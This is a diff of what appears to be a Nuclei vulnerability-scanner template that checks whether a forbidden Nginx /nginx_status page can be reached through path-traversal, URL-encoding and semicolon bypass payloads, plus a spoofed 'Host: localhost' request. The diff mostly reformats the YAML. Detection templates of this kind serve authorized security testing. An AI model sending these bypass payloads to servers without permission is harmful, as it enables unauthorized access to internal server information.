@@ -1,5 +1,4 @@
 id: nginx-status-403-bypass
-
 info:
   name: Nginx Status Page - 403 Bypass
   author: pussycat0x
@@ -8,63 +7,58 @@ info:
     Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.
   reference:
     - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
+  classification:
+    cwe-id:
+      - CWE-22
   metadata:
+    shodan-query: server:nginx
     verified: true
-    shodan-query: "server:nginx"
-  tags: nginx,status,disclosure,bypass,misconfig
-
+  tags: bypass,disclosure,misconfig,nginx,status
 flow: http(1) && (http(2) || http (3))
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/nginx_status"
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "status_code == 403"
+  - matchers:
+      - dsl:
+          - status_code == 403
         internal: true
-
-  - method: GET
+        type: dsl
+    method: GET
     path:
-      - "{{BaseURL}}{{paths}}"
-
-    attack: clusterbomb
+      - '{{BaseURL}}/nginx_status'
+  - attack: clusterbomb
+    matchers:
+      - condition: and
+        dsl:
+          - status_code == 200
+          - contains(body, "Active connections:")
+        type: dsl
+    method: GET
+    path:
+      - '{{BaseURL}}{{paths}}'
     payloads:
       paths:
-        - "/../nginx_status"
-        - "/./nginx_status"
-        - "/.//nginx_status"
-        - "/./..;/nginx_status"
-        - "/%2e%2e/nginx_status"
-        - "/./%252e%252e/nginx_status"
-        - "/./%6e%67%69%6e%78_%73%74%61%74%75%73"
-        - "/;/nginx_status"
-        - "/./?/nginx_status"
-        - "/./nginx_status;"
-        - "/./nginx_status%20"
-        - "/./nginx_status/"
-
+        - /../nginx_status
+        - /./nginx_status
+        - /.//nginx_status
+        - /./..;/nginx_status
+        - /%2e%2e/nginx_status
+        - /./%252e%252e/nginx_status
+        - /./%6e%67%69%6e%78_%73%74%61%74%75%73
+        - /;/nginx_status
+        - /./?/nginx_status
+        - /./nginx_status;
+        - /./nginx_status%20
+        - /./nginx_status/
     stop-at-first-match: true
+  - matchers:
+      - condition: and
+        # digest: 4a0a00473045022100dfd848ecc70909cd1d833ea5051419a90b3fffe0fa3be5cd7a5b338277caecb402204e75641d67e37ed61daebaba3b336e03f17c1493e9ee34515b038cb467575651:922c64590222798bb761d5b6d8e72950
 
-    matchers:
-      - type: dsl
         dsl:
-          - 'status_code == 200'
-          - 'contains(body, "Active connections:")'
-        condition: and
-
-  - raw:
+          - status_code == 200
+          - contains(body, "Active connections:")
+        type: dsl
+    raw:
       - |
         @Host: localhost
         GET /nginx_status HTTP/1.1
         Host: localhost
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 200'
-          - 'contains(body, "Active connections:")'
-        condition: and
-# digest: 4a0a004730450221008990bbf15695df49dc5c9a973ce8f73f22f12c9e19277f9c0fabd5fa54731bb4022003f81a040879d7961799ca687323bc6584ae1ac3a3302f57e9112aa92ca4dd18:922c64590222798bb761d5b6d8e72950
